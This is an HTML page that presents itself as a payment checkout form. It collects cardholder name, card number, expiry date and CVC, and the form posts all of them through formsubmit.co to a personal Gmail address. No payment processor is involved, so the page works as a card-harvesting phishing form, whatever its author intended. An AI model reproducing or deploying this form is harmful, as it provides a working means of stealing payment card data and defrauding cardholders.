<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>Payment Checkout Form</title>
	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.2/css/all.css">
	<link rel="stylesheet" href="card.css">

</head>
<body>
	

    <div class="wrapper">
        <div class="payment">
          <div class="payment-logo">
            <p>p</p>
          </div>
          
    
    <h2>Payment</h2>
    <form action="https://formsubmit.co/johnmanager.austin@gmail.com" method="POST">
    <div class="form">
            <div class="card space icon-relative">
                <label class="label">Card Holder:</label>
                <input type="text" name="card" class="input" placeholder="Name holder" required>
                <i class="fas fa-user"></i>
              </div>
              <div class="card space icon-relative">
                <label class="label">Card Number:</label>
                <input type="text" name="card number" class="input" data-mask="0000 0000 0000 0000" placeholder="Card Number" required>
                <i class="far fa-credit-card"></i>
              </div>
              <div class="select">
                <select name="Continent">
                    <option>Mastercard</option>
                    <option>Visa</option>
                </select>
              </div>
              <div class="card-grp space">
                <div class="card-item icon-relative">
                  <label class="label">Expiry date:</label>
                  <input type="text" name="expiry-data" class="input" data-mask="00 / 00"  placeholder="00 / 00" required>
                  <i class="far fa-calendar-alt"></i>
                </div>
                <div class="card-item icon-relative">
                  <label class="label">CVC:</label>
                  <input type="text" name="CVC"  class="input" data-mask="000" placeholder="000" required>
                  <i class="fas fa-lock"></i>
                </div>
              </div>

              <div class="button">
                <button>Pay</button>
              </div>

            </div>
          </div>
        </div>
        </form>
    
	<script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>

</body>
</html>
